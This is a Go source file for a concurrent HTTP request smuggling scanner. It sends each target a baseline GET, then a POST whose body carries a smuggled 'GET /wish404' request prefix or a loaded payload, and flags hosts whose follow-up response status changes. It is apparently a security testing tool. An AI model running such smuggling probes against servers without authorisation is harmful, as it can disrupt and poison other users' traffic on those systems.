package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/httptrace"
	"net/http/httputil"
	"os"
	"strconv"
	"strings"
	"sync"
)

var (
	wg          sync.WaitGroup
	logfile     *os.File
	client      *http.Client
	outfile     *os.File
	err         error
	payload     string = "GET /wish404 HTTP/1.1\r\nX: x"
	d           []byte
	traceCtx    context.Context
	clientTrace *httptrace.ClientTrace
	verbose     bool
)

func main() {
	var filename string
	flag.StringVar(&filename, "f", "", "a list of hosts to probe")

	var u string
	flag.StringVar(&u, "u", "", "a u to probe")

	var outpath string
	flag.StringVar(&outpath, "o", "out.txt", "output file")

	var payloadFile string
	flag.StringVar(&payloadFile, "p", "", "payload file")

	var concurrency int
	flag.IntVar(&concurrency, "c", 50, "concurrency level")

	flag.BoolVar(&verbose, "v", false, "verbose")

	flag.Parse()

	if filename == "" && u == "" {
		os.Exit(1)
	}

	if payloadFile != "" {
		d, err = os.ReadFile(payloadFile)
		smug := string(d)[:len(d)-1]
		payload = strings.ReplaceAll(smug, "\n", "\r\n")
	}

	clientTrace = &httptrace.ClientTrace{
		GotConn: func(info httptrace.GotConnInfo) {
			if info.Reused {
				fmt.Fprintln(logfile, u)
			}
		},
	}
	traceCtx = httptrace.WithClientTrace(context.Background(), clientTrace)

	logfile, err = os.OpenFile("reused.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer logfile.Close()

	outfile, err = os.OpenFile(outpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer outfile.Close()

	client = &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	if filename != "" {
		b, err := os.ReadFile(filename)
		if err != nil {
			if verbose {
				panic(err)
			}
			return
		}

		lines := strings.Split(string(b), "\n")
		lines = lines[:len(lines)-1]
		input := make(chan string)

		// Initiate workers
		for i := 0; i < concurrency; i++ {
			wg.Add(1)
			go func() {
				for u := range input {
					detect(u)
				}
				wg.Done()
			}()
		}

		// Read lines into the input channel
		for _, line := range lines {
			input <- line
		}
		close(input)
		wg.Wait()
	}

	if u != "" {
		detect(u)
	}
}

func check(err error) {
	if err != nil {
		if verbose {
			panic(err)
		}
		panic(err)
	}
}

func addHeaders(r *http.Request, headers map[string]string) {
	for key, value := range headers {
		r.Header.Set(key, value)
	}
}

func detect(u string) {
	// Prepare the request stub
	reqStub, err := http.NewRequestWithContext(traceCtx, "GET", u, nil)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}

	reqStub.Header.Set("Host", reqStub.Host)

	resOriginal, err := client.Do(reqStub)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	d, err = httputil.DumpResponse(resOriginal, true)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	resOriginal.Body.Close()
	resOriginalHead, resOriginalBody := splitResponse(d)

	// Prepare smuggle request which should cause the difference in the response
	// to the next request
	reqSmuggle, err := http.NewRequestWithContext(traceCtx, "POST", u, nil)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}

	reqSmuggle.Body = io.NopCloser(strings.NewReader(payload))
	reqSmuggle.ContentLength = int64(len(payload))
	headers := map[string]string{
		"Host":           reqSmuggle.Host,
		"Connection":     "keep-alive",
		"Content-Length": strconv.Itoa(len(payload)),
	}

	addHeaders(reqSmuggle, headers)

	// Send smuggle request
	resSmuggle, err := client.Do(reqSmuggle)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	
	resSmuggleBody, err := io.ReadAll(resSmuggle.Body)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	resSmuggle.Body.Close()

	// Send the follow up request (an identical request to the first request)
	resFollow, err := client.Do(reqStub)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	
	defer resFollow.Body.Close()

	d, err = httputil.DumpResponse(resSmuggle, false)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}
	
	resSmuggleHeaders := string(d)

	d, err = httputil.DumpResponse(resFollow, true)
	if err != nil {
		if verbose {
			panic(err)
		}
		return
	}

	followHead, followBody := splitResponse(d)

	output := fmt.Sprintf(
		"%s\nRESPONSE:\n%s\n%s\n\nFOLLOW:\n%s\n\n%s\n\nORIGINAL:\n%s\n\n%s\n",
		u,
		resSmuggleHeaders,
		resBody(string(resSmuggleBody)),
		followHead,
		resBody(followBody),
		resOriginalHead,
		resBody(resOriginalBody),
	)

	os.WriteFile("outs/"+reqStub.Host, []byte(output),
		0644)
	resFollow.Body.Close()

	// This is how detection is done:
	// if status codes change while the same request is sent,
	// then this is because part of the smuggle request (its body) was not processed until
	// the follow up request reached  the server.
	if resFollow.StatusCode != resOriginal.StatusCode {
		fmt.Println(u)
		outfile.WriteString(u + "\n")
	}
}

func splitResponse(d []byte) (string, string) {
	x := strings.Split(string(d), "\r\n\r\n")
	var head, body string
	if len(x) > 1 {
		head, body = x[0], x[1]
	}

	return head, body
}

func resBody(resp_body string) string {
	var responseText string
	if len(resp_body) == 0 {
		responseText = "EMPTY RESPONSE"
	} else if len(resp_body) < 100 {
		responseText = string(resp_body)
	} else {
		responseText = string(resp_body)[:100] + " ... " + strconv.Itoa(len(resp_body)-100)
	}

	return responseText
}
